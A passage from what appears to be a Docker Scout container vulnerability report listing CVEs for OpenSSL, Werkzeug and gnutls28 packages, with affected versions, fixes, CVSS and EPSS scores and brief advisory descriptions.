Issue summary: Parsing CMS AuthEnvelopedData or EnvelopedData message with maliciously crafted AEAD parameters can trigger a stack buffer overflow.  Impact summary: A stack buffer overflow may lead to a crash, causing Denial of Service, or potentially remote code execution.  When parsing CMS (Auth)EnvelopedData structures that use AEAD ciphers such as AES-GCM, the IV (Initialization Vector) encoded in the ASN.1 parameters is copied into a fixed-size stack buffer without verifying that its length fits the destination. An attacker can supply a crafted CMS message with an oversized IV, causing a stack-based out-of-bounds write before any authentication or tag verification occurs.  Applications and services that parse untrusted CMS or PKCS#7 content using AEAD ciphers (e.g., S/MIME (Auth)EnvelopedData with AES-GCM) are vulnerable. Because the overflow occurs prior to authentication, no valid key material is required to trigger it. While exploitability to remote code execution depends on platform and toolchain mitigations, the stack-based write primitive represents a severe risk.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the CMS implementation is outside the OpenSSL FIPS module boundary.  OpenSSL 3.6, 3.5, 3.4, 3.3 and 3.0 are vulnerable to this issue.  OpenSSL 1.1.1 and 1.0.2 are not affected by this issue.

---
- openssl 3.5.5-1
[bullseye] - openssl <not-affected> (Vulnerable code introduced later)
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/d0071a0799f20cc8101730145349ed4487c268dc (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/9f6338e92c96ffc70b0223bf5da0c134a8eef9fb (openssl-3.5.5)
Test: https://github.com/openssl/openssl/commit/a114855991da05631cce17a52a143f10d80b4193 (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/ce39170276daec87f55c39dad1f629b56344429e (openssl-3.0.19)
Fixed by: https://github.com/openssl/openssl/commit/cdccf8f2ef17ae020bd69360c43a39306b89c381 (openssl-3.0.19)
Test: https://github.com/openssl/openssl/commit/e0666f72294691a808443970b654412a6d92fa0f (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-0928?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D3.0.11-1%7Edeb12u2"><img alt="low : CVE--2010--0928" src="https://img.shields.io/badge/CVE--2010--0928-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=3.0.11-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.098%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSL 0.9.8i on the Gaisler Research LEON3 SoC on the Xilinx Virtex-II Pro FPGA uses a Fixed Width Exponentiation (FWE) algorithm for certain signature calculations, and does not verify the signature before providing it to a caller, which makes it easier for physically proximate attackers to determine the private key via a modified supply voltage for the microprocessor, related to a "fault-based attack."

---
http://www.eecs.umich.edu/~valeria/research/publications/DATE10RSA.pdf
https://github.com/openssl/openssl/discussions/24540
Fault injection based attacks are not within OpenSSLs threat model according
to the security policy: https://www.openssl.org/policies/general/security-policy.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 4" src="https://img.shields.io/badge/H-4-e25d68"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>werkzeug</strong> <code>1.0.1</code> (pypi)</summary>

<small><code>pkg:pypi/werkzeug@1.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-29361?s=pypa&n=werkzeug&t=pypi&vr=%3C2.1.1"><img alt="critical : CVE--2022--29361" src="https://img.shields.io/badge/CVE--2022--29361-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.1.1</code></td></tr>
<tr><td>EPSS Score</td><td><code>31.113%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>97th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

** DISPUTED ** Improper parsing of HTTP requests in Pallets Werkzeug v2.1.0 and below allows attackers to perform HTTP Request Smuggling using a crafted HTTP request with multiple requests included inside the body. NOTE: the vendor's position is that this behavior can only occur in unsupported configurations involving development mode and an HTTP server from outside the Werkzeug project.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-49767?s=gitlab&n=werkzeug&t=pypi&vr=%3C3.0.6"><img alt="high 7.5: CVE--2024--49767" src="https://img.shields.io/badge/CVE--2024--49767-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code><3.0.6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.090%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Applications using Werkzeug to parse `multipart/form-data` requests are vulnerable to resource exhaustion. A specially crafted form body can bypass the `Request.max_form_memory_size` setting.


The `Request.max_content_length` setting, as well as resource limits provided by deployment software and platforms, are also available to limit the resources used during a request. This vulnerability does not affect those settings. All three types of limits should be considered and set appropriately when deploying an application.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-34069?s=github&n=werkzeug&t=pypi&vr=%3C3.0.3"><img alt="high 7.5: CVE--2024--34069" src="https://img.shields.io/badge/CVE--2024--34069-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Cross-Site Request Forgery (CSRF)</i>

<table>
<tr><td>Affected range</td><td><code><3.0.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>43.650%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-46136?s=pypa&n=werkzeug&t=pypi&vr=%3C2.3.8"><img alt="high 7.5: CVE--2023--46136" src="https://img.shields.io/badge/CVE--2023--46136-lightgrey?label=high%207.5&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.3.8</code></td></tr>
<tr><td>Fixed version</td><td><code>2.3.8</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.877%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug is a comprehensive WSGI web application library. If an upload of a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer. This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. This vulnerability has been patched in version 3.0.1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-25577?s=github&n=werkzeug&t=pypi&vr=%3C2.2.3"><img alt="high 7.5: CVE--2023--25577" src="https://img.shields.io/badge/CVE--2023--25577-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><2.2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.2.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.366%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's multipart form data parser will parse an unlimited number of parts, including file parts. Parts can be a small amount of bytes, but each requires CPU time to parse and may use more memory as Python data. If a request can be made to an endpoint that accesses `request.data`, `request.form`, `request.files`, or `request.get_data(parse_form_data=False)`, it can cause unexpectedly high resource usage.

This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. Unlimited file parts can use up memory and file handles. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27199?s=github&n=werkzeug&t=pypi&vr=%3C3.1.6"><img alt="medium 6.3: CVE--2026--27199" src="https://img.shields.io/badge/CVE--2026--27199-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows Windows device names as filenames if when preceded by other path segments.

This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact that `safe_join` accepts paths with multiple segments, such as `example/NUL`.

`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-21860?s=github&n=werkzeug&t=pypi&vr=%3C3.1.5"><img alt="medium 6.3: CVE--2026--21860" src="https://img.shields.io/badge/CVE--2026--21860-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.

This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.

`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66221?s=github&n=werkzeug&t=pypi&vr=%3C3.1.4"><img alt="medium 6.3: CVE--2025--66221" src="https://img.shields.io/badge/CVE--2025--66221-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Handling of Windows Device Names</i>

<table>
<tr><td>Affected range</td><td><code><3.1.4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-49766?s=github&n=werkzeug&t=pypi&vr=%3C%3D3.0.5"><img alt="medium 6.3: CVE--2024--49766" src="https://img.shields.io/badge/CVE--2024--49766-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=3.0.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.392%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Python < 3.11 on Windows, `os.path.isabs()` does not catch UNC paths like `//server/share`. Werkzeug's `safe_join()` relies on this check, and so can produce a path that is not safe, potentially allowing unintended access to data. Applications using Python >= 3.11, or not using Windows, are not vulnerable.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-23934?s=github&n=werkzeug&t=pypi&vr=%3C2.2.3"><img alt="low 2.6: CVE--2023--23934" src="https://img.shields.io/badge/CVE--2023--23934-lightgrey?label=low%202.6&labelColor=fce1a9"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><2.2.3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.2.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.267%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Browsers may allow "nameless" cookies that look like `=value` instead of `key=value`. A vulnerable browser may allow a compromised application on an adjacent subdomain to exploit this to set a cookie like `=__Host-test=bad` for another subdomain.

Werkzeug <= 2.2.2 will parse the cookie `=__Host-test=bad` as `__Host-test=bad`. If a Werkzeug application is running next to a vulnerable or malicious subdomain which sets such a cookie using a vulnerable browser, the Werkzeug application will see the bad cookie value but the valid cookie key.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 8" src="https://img.shields.io/badge/H-8-e25d68"/> <img alt="medium: 8" src="https://img.shields.io/badge/M-8-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>gnutls28</strong> <code>3.7.9-2+deb12u3</code> (deb)</summary>

<small><code>pkg:deb/debian/gnutls28@3.7.9-2%2Bdeb12u3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-5260?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--5260" src="https://img.shields.io/badge/CVE--2026--5260-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.232%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in libgnutls. A remote attacker, by sending an extremely short premaster secret during an RSA key exchange to a server using an RSA key backed by a PKCS#11 token, could trigger a short heap overread. This memory corruption vulnerability could lead to information disclosure.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-10
https://gitlab.com/gnutls/gnutls/-/issues/1814
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/77228f2d1ac207d2f894e5a168fbb47e5378e42f (3.8.13)
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/cf6bdc5e4df49e5583d3fb4d2296779785f10683 (3.8.13)
Introduced with: https://gitlab.com/gnutls/gnutls/-/commit/4804febddc2ed958e5ae774de2a8f85edeeff538 (gnutls_3_6_5)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42013?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--42013" src="https://img.shields.io/badge/CVE--2026--42013-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.052%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. When validating certificates, an oversized Subject Alternative Name (SAN) could cause the validation process to incorrectly fall back to checking the Common Name (CN) field. This could allow a remote attacker to bypass proper certificate validation, potentially leading to spoofing or man-in-the-middle attacks.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-8
https://gitlab.com/gnutls/gnutls/-/work_items/1825
https://gitlab.com/gnutls/gnutls/-/issues/1849
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/29801bef00ecc0f23c0bac4cd333b269cd2c1af4 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42009?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--42009" src="https://img.shields.io/badge/CVE--2026--42009-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.715%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>73rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. A remote attacker could exploit an issue in the Datagram Transport Layer Security (DTLS) packet reordering logic. The comparator function, responsible for ordering DTLS packets by sequence numbers, did not correctly handle packets with duplicate sequence numbers. This could lead to unstable packet ordering or undefined behavior, resulting in a denial of service.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-2
https://gitlab.com/gnutls/gnutls/-/issues/1848
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/f01e21441e29052a6f0963840794c41d3b3ee66d (3.8.13)
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/f341441fad91142897d83b44a175ffc8f925b76f (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33846?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--33846" src="https://img.shields.io/badge/CVE--2026--33846-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.089%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow vulnerability exists in the DTLS handshake fragment reassembly logic of GnuTLS. The issue arises in merge_handshake_packet() where incoming handshake fragments are matched and merged based solely on handshake type, without validating that the message_length field remains consistent across all fragments of the same logical message. An attacker can exploit this by sending crafted DTLS fragments with conflicting message_length values, causing the implementation to allocate a buffer based on a smaller initial fragment and subsequently write beyond its bounds using larger, inconsistent fragments. Because the merge operation does not enforce proper bounds checking against the allocated buffer size, this results in an out-of-bounds write on the heap. The vulnerability is remotely exploitable without authentication via the DTLS handshake path and can lead to application crashes or potential memory corruption.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-1
https://gitlab.com/gnutls/gnutls/-/work_items/1816
https://gitlab.com/gnutls/gnutls/-/work_items/1838
https://gitlab.com/gnutls/gnutls/-/work_items/1839
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/65ab33fa54e34fba69d793735b7df3d383d1ff78 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-33845?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--33845" src="https://img.shields.io/badge/CVE--2026--33845-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.100%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw in GnuTLS DTLS handshake parsing allows malformed fragments with zero length and non-zero offset, leading to an integer underflow during reassembly and resulting in an out-of-bounds read. This issue is remotely exploitable and may cause information disclosure or denial of service.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-3
https://gitlab.com/gnutls/gnutls/-/issues/1811
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/e5b72c53c7d789d19d1d1cd10b275e87d0415413 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42011?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--42011" src="https://img.shields.io/badge/CVE--2026--42011-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. This vulnerability occurs because permitted name constraints were incorrectly ignored when previous Certificate Authorities (CAs) only had excluded name constraints. A remote attacker could exploit this to bypass critical name constraint checks during certificate validation. This bypass could lead to the acceptance of invalid certificates, potentially enabling spoofing or man-in-the-middle attacks against affected systems.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-6
https://gitlab.com/gnutls/gnutls/-/work_items/1824
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/1dead2faec6320aaba321eb56f20d442df192b83 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42012?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--42012" src="https://img.shields.io/badge/CVE--2026--42012-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.044%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. A remote attacker could exploit this vulnerability by presenting a specially crafted certificate that contains Uniform Resource Identifier (URI) or Service (SRV) Subject Alternative Names (SANs). This could cause the certificate validation process to incorrectly fall back to checking DNS hostnames against the Common Name (CN), potentially allowing the attacker to spoof legitimate services or intercept sensitive information.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-7
https://gitlab.com/gnutls/gnutls/-/issues/1802
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/8dcc6a1f48945997666ac9f10896819edd01a03b (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42010?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="high : CVE--2026--42010" src="https://img.shields.io/badge/CVE--2026--42010-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.144%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. Servers configured with RSA-PSK (Rivest–Shamir–Adleman – Pre-Shared Key) wrongfully matched usernames containing a NUL character with truncated usernames. A remote attacker could exploit this by sending a specially crafted username, leading to an authentication bypass. This vulnerability allows an attacker to gain unauthorized access by circumventing the authentication process.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-4
https://gitlab.com/gnutls/gnutls/-/issues/1850
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/cb1833afd9b6309563211b1c0a7c291f52ca98d5 (3.8.13)
Introduced with: https://gitlab.com/gnutls/gnutls/-/commit/d00638997fa269a975095d852633b48b2b64fbf9 (3.6.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-3833?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="medium : CVE--2026--3833" src="https://img.shields.io/badge/CVE--2026--3833-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.175%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. This vulnerability occurs because gnutls performs case-sensitive comparisons of `nameConstraints` labels, specifically for `dNSName` (DNS) or `rfc822Name` (email) constraints within `excludedSubtrees` or `permittedSubtrees`. A remote attacker can exploit this by crafting a leaf certificate with casing differences in the Subject Alternative Name (SAN), leading to a policy bypass where a certificate that should be rejected is instead accepted. This could result in unauthorized access or information disclosure.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-5
https://gitlab.com/gnutls/gnutls/-/work_items/1223
https://gitlab.com/gnutls/gnutls/-/issues/1803
https://gitlab.com/gnutls/gnutls/-/issues/1852
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/19f6508647bdcd3ce21130201e484d7ca6d962c5 (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6395?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="medium : CVE--2025--6395" src="https://img.shields.io/badge/CVE--2025--6395-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.266%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

